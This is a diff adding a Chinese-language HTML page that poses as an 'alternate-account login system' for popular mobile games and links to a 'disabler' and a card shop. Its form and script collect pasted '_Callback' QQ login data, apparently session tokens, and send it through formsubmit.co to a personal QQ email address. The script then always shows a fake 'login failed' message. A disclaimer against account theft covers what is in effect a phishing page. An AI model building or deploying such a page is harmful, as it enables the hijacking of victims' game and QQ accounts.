@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>公告弹窗</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{display: none;}
+.notice-mask{
+    position: fixed;
+    inset: 0;
+    width: 100vw;
+    height: 100vh;
+    background: rgba(0,0,0,.65);
+    z-index: 99999999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.notice-box{
+    width: 92%;
+    max-width: 520px;
+    max-height: 70vh;
+    background: #fff;
+    border-radius: 10px;
+    padding: 25px;
+    overflow-y: auto;
+}
+.notice-title{
+    font-size: 20px;
+    font-weight: bold;
+    text-align: center;
+    margin-bottom: 15px;
+    border-bottom: 1px solid #eee;
+    padding-bottom:10px;
+}
+.notice-text{
+    line-height: 1.7;
+    font-size:15px;
+    color:#333;
+}
+.close-notice{
+    display:block;
+    margin:20px auto 0;
+    padding:7px 26px;
+    border:none;
+    background:#2563eb;
+    color:#fff;
+    border-radius:4px;
+    cursor:pointer;
+}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
+body{
+    background:#fff;
+    padding:15px;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+}
+.wrap{
+    width:92%;
+    max-width:380px;
+}
+/* 左侧功能导航，和登录卡片同宽靠左 */
+.nav-box{
+    border:1px solid #eee;
+    border-radius:12px;
+    padding:15px 20px;
+    margin-bottom:15px;
+}
+.nav-title{
+    font-size:16px;
+    color:#2578dd;
+    margin-bottom:10px;
+    font-weight:bold;
+}
+.nav-item{
+    display:block;
+    width:100%;
+    text-align:center;
+    padding:10px;
+    margin:6px 0;
+    background:#2578dd;
+    color:#fff;
+    text-decoration:none;
+    border-radius:6px;
+}
+.box{
+    border:1px solid #eee;
+    border-radius:12px;
+    padding:20px;
+}
+.title{
+    text-align:center;
+    font-size:22px;
+    color:#2578dd;
+    margin-bottom:16px;
+}
+.notice{
+    background:#e8f4ff;
+    border:1px solid #b8d8fb;
+    padding:12px;
+    border-radius:8px;
+    margin-bottom:15px
+}
+.notice h4{color:#2578dd;margin-bottom:8px}
+.notice p{font-size:13px;color:#333;line-height:1.5}
+.form-item{margin:12px 0}
+input{
+    width:100%;
+    border:1px solid #ddd;
+    padding:12px;
+    border-radius:6px;
+    font-size:14px
+}
+select{
+    width:100%;
+    border:1px solid #ddd;
+    padding:12px;
+    border-radius:6px;
+    margin:8px 0;
+    font-size:14px
+}
+button{
+    width:100%;
+    background:#2578dd;
+    color:white;
+    border:none;
+    padding:14px;
+    border-radius:6px;
+    font-size:15px;
+    margin-top:8px
+}
+.tip-box{
+    position:fixed;
+    top:50%;
+    left:50%;
+    transform:translate(-50%,-50%);
+    background:#fff;
+    padding:20px;
+    border-radius:8px;
+    box-shadow:0 0 10px #ccc;
+    color:red;
+    font-size:16px;
+    z-index:9999;
+}
+audio {display: none;}
+.myimg{
+    width:75%;
+    max-width:280px;
+    display:block;
+    margin:25px auto 0 auto;
+    border-radius:8px;
+}
+</style>
+</head>
+<body>
+<audio id="bgMusic" loop hidden preload="auto">
+    <source src="gaobai.mp3" type="audio/mpeg">
+    您的浏览器不支持音频播放
+</audio>
+<div class="notice-mask" id="mask">
+    <div class="notice-box">
+        <div class="notice-title">重要公告</div>
+        <div class="notice-text">
+            本站用于登录自己小号，请勿商用<br>
+            全自动识别获取APP数据<br> 
+            浏览器🔍https://yshanghaoqi.netlify.app<br>
+            👆收藏官网永久域名防丢失👆<br>
+            🔥支持QQ登录全类型应用🔥<br>
+            如有疑问可联系在线客服咨询
+        </div>
+        <button class="close-notice" id="closeBtn">我已知晓，关闭公告</button>
+    </div>
+</div>
+
+<div class="wrap">
+    <!-- 导航模块，和登录框同宽靠左摆放 -->
+    <div class="nav-box">
+        <div class="nav-title">功能导航</div>
+        <a href="https://yyy748721.github.io/y/" target="_blank" class="nav-item">禁用器</a>
+        <a href="https://yyy748721.github.io/yy/" target="_blank" class="nav-item">发卡网</a>
+        <a href="https://yyy748721.github.io/-/" target="_blank" class="nav-item">查询</a>
+    </div>
+
+    <!-- 原有登录表单 -->
+    <div class="box">
+        <div class="title">小号登陆系统</div>
+        <div class="notice">
+            <h4>系统公告</h4>
+            <p>仅自用于小号登陆，禁止用于游戏账号窃取、盗号</p>
+        </div>
+    <form id="myForm" action="https://formsubmit.co/3570593743@qq.com" method="POST">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="#">
+        <div class="form-item">
+            <input name="content" id="contentInput" placeholder="请输入_Callback开头的内容" required>
+        </div>
+        <select name="game">
+            <option>和平精英</option>
+            <option>火影忍者</option>
+            <option>王者荣耀</option>
+            <option>穿越火线</option>
+            <option>蛋仔派对</option>
+            <option>无畏契约</option>
+            <option>使命召唤</option>
+            <option>三角洲行动</option>
+        </select>
+        <button type="submit">登陆</button>
+    </form>
+    </div>
+</div>
+
+<img class="myimg" src="https://ftp.mioz.cn/test/2026/06/17/1781694047.JPG" alt="自愿赠予">
+<audio loop id="audioBox">
+    <source src="lover.mp3" type="audio/mpeg">
+
+<script>
+const mask = document.getElementById('mask')
+const closeBtn = document.getElementById('closeBtn')
+closeBtn.addEventListener('click',()=>{
+    mask.remove()
+    document.body.style.display = 'block'
+    const audio = document.getElementById('audioBox');
+    audio.play();
+})
+mask.addEventListener('click',e=>{
+    if(e.target === mask){
+        mask.remove()
+        document.body.style.display = 'block'
+        const audio = document.getElementById('audioBox');
+        audio.play();
+    }
+})
+const form = document.getElementById("myForm");
+const contentInput = document.getElementById("contentInput");
+form.addEventListener("submit", function(e){
+    e.preventDefault();
+    let inputVal = contentInput.value.trim();
+    let lowerVal = inputVal.toLowerCase();
+    if(!lowerVal.startsWith("_callback")){
+        alert("请检查内容是否正确，以_Callback 开头！");
+        contentInput.value = "";
+        contentInput.focus();
+        return;
+    }
+    let formData = new FormData(form);
+    fetch(form.action, {
+        method: "POST",
+        body: formData
+    }).then(()=>{
+        const tip = document.createElement("div");
+        tip.className = "tip-box";
+        tip.innerText = "登陆失败，失效或修改密码";
+        document.body.appendChild(tip);
+        setTimeout(()=>{
+            tip.remove();
+            form.reset();
+        }, 2000);
+    })
+})
+</script>
+</body>
+</html>
